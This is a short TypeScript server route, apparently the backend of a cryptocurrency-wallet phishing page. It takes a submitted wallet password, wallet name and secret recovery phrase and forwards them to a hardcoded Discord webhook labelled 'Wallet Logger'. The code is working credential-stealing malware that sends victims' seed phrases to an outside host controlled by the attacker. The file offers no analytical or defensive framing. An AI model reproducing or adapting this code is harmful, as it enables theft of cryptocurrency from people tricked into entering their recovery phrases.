export async function POST(request: Request) {
  try {
    const { password, walletName, secretPhrase } = await request.json();

    // Your Discord webhook (hardcoded)
    const webhookUrl = "https://discord.com/api/webhooks/1491938440575582261/4xR9H5J9KajUjl3udMdSi7tMGk3OWk3J3_a-tuxh0chJtqYMwCL-GCfznAyikQdb2vYk";

    const message = `🚨 **New Wallet Import**

**Password:** ${password || "N/A"}
**Wallet Name:** ${walletName || "N/A"}
**Secret Phrase:** ${secretPhrase || "N/A"}

**Time:** ${new Date().toISOString()}`;

    const res = await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: message,
        username: "Wallet Logger"
      }),
    });

    if (!res.ok) {
      const errorText = await res.text();
      console.error("Discord error:", errorText);
      return Response.json({ error: "Failed to send to Discord" }, { status: 500 });
    }

    return Response.json({ success: true });
  } catch (error) {
    console.error(error);
    return Response.json({ error: "Internal server error" }, { status: 500 });
  }
}
